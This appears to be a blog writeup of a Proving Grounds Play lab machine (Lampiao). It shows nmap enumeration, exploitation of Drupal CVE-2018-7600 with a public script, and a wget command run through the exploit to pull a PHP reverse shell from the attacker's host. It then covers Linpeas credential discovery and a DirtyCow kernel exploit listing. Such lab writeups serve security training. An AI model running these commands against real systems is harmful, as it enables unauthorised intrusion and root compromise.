---
layout: single
title: Lampiao - Proving grounds Play
date: 2023-13-06
classes: wide
header:
  teaser: /assets/images/linux.png
categories:
  - provinggrounds
  - infosec
tags:
  - provinggrounds
  - linux
  - drupal
  - dirtycow
  - kernel
---

## Linux

![](/assets/images/linux.png)

This blog post is a writeup of the Lampiao machine from Proving grounds play.

### Summary
------------------
- The webserver has a vulnerable Drupal version to RCE.
- We access exploiting this vulnerability.
- We are able to find credentials which allows us to login with a higher privileged user than www-data.
- The Linux kernel version it's vulnerable to dirtycow.
- Exploiting this dirtycow vulnerability allows us to gain access as root user.
### Detailed steps
------------------

### Enumeration

There's a webserver, a SSH service and another interesting open port (1898) running on this box.

![nmap1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\1.JPG)

Let's take a closer look at these ports with Nmap.
 ```
 nmap -A 192.168.201.48 -p 22,80,1898 -o nmap_lampiao.txt
 ```
![nmap2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\2.JPG)


As we can see in the last picture, the 1898 port it's running an HTTP service. Nmap HTTP enum returns some interesting files as CHANGELOG.TXT

CHANGELOG.txt it's a common file in Drupal which shows the current version.
In this case the current version it's `7.54`.

![changelog](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\5.JPG)


`Drupal 7.54` it's vulnerable to a remote code execution as we can see in `CVE-2018-7600` --> https://www.drupal.org/sa-core-2018-002
To exploit this vulnerability I used the following python code --> https://github.com/pimps/CVE-2018-7600

The first step was to check the vulnerability. I successfully executed the exploit with `id` command.
 ```
 python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c id
 ```

![exploit1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\6.JPG)


Now, in order to gain access to the victim's machine, I uploaded a PHP revershell to the webserver.

Configuring the webshell:
![shell1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\7.JPG)

After configuring the webshell, I opened an HTTP server on my Kali machine with python in my webshell directory:
 ```
 python3 -m http.server 443
 ```

To upload the webshell I used the python exploit to execute a wget command on the victim's machine:
 ```
 python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c "wget http://192.168.45.177:443/php-reverse-shell.php"
 ```
![exploit2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\8.JPG)


At this point, I was able to access to my webshell on victim's machine and capture the shell running a Netcat listener.
![shell2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\10.JPG)

![shell3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\9.JPG)


Having access to www-data user I was able to find the first flag:
![userflag](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\userf.jpg)



### Privilege scalation

To elevete my privileges I used Linpeas.sh --> https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

Linpeas found the following files with an interesting credentials:
![creds](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\15.JPG)

This credentials allowed me to log in via SSH with "tiago" user
![shell3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\18.JPG)


Linpeas found a kernel vulnerability too:
```
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```